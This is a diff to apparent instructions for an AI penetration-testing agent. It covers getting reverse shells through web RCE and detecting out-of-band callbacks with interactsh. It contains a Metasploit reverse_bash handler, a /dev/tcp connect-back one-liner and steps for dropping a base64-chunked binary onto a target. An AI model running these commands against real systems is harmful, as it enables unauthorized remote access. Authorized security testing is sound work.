@@ -588,7 +588,16 @@ Critical-impact proofs (Level 4). Pick the MINIMUM viable proof; do not chain.
 ```
 
 **Reverse shell (only if explicitly requested by operator):**
-- Generate via `msfvenom` in kali_shell, host via chisel/ngrok if behind NAT
+- In a web RCE you have NO session yet and the target cannot fetch from your sandbox or the
+  chat card, so do not try to stage a binary. Fire a one-line connect-back straight through
+  the RCE and catch it on a matching handler. Take LHOST/LPORT from the "Pre-Configured
+  Payload Settings" block (never a hardcoded port); your tunnel, if any, is RedAmon-managed
+  (do NOT start chisel/ngrok yourself). Example:
+  - handler: `use exploit/multi/handler; set payload cmd/unix/reverse_bash; set LHOST <LHOST>; set LPORT <LPORT>; run -j`
+    (WITH A TUNNEL also `set ReverseListenerBindAddress 127.0.0.1; set ReverseListenerBindPort 4444`).
+  - inject through the RCE: `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`.
+- If you must drop a real binary (no shell one-liner lands), write it THROUGH the RCE in
+  printf/base64 chunks, then `chmod +x` and run it on the target — never host it for fetch.
 - Use `set ExitOnSession false` so the handler stays available
 - IMMEDIATELY take a screenshot of `id;uname -a;hostname` from the shell, then
   background it. Do NOT explore filesystem or move laterally without authorization.
@@ -643,8 +652,10 @@ blocks inline output, or you want a near-zero-noise oracle. Requires
 
 ### Step 1: Start interactsh-client as a background process
 
+Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
+
 ```
-kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
+kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh-RUN.log 2>&1 & echo $!"})
 ```
 
 **Save the PID** for later cleanup.
@@ -652,7 +663,7 @@ kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/inter
 ### Step 2: Read the registered callback domain
 
 ```
-kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
+kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh-RUN.log"})
 ```
 
 Look for the `.oast.fun` domain (e.g. `abc123xyz.oast.fun`). This is your
@@ -700,7 +711,7 @@ ysoserial URLDNS http://REGISTERED_DOMAIN > /tmp/payload.bin
 ### Step 4: Poll for callbacks
 
 ```
-kali_shell({"command": "tail -50 /tmp/interactsh.log"})
+kali_shell({"command": "tail -50 /tmp/interactsh-RUN.log"})
 ```
 
 JSON lines you will see:
@@ -716,7 +727,7 @@ the subdomain prefix, that's Level 2.
 
 ```
 kali_shell({"command": "kill SAVED_PID"})
-kali_shell({"command": "rm /tmp/interactsh.log /tmp/payload.bin 2>/dev/null"})
+kali_shell({"command": "rm /tmp/interactsh-RUN.log /tmp/payload.bin 2>/dev/null"})
 ```
 """
 
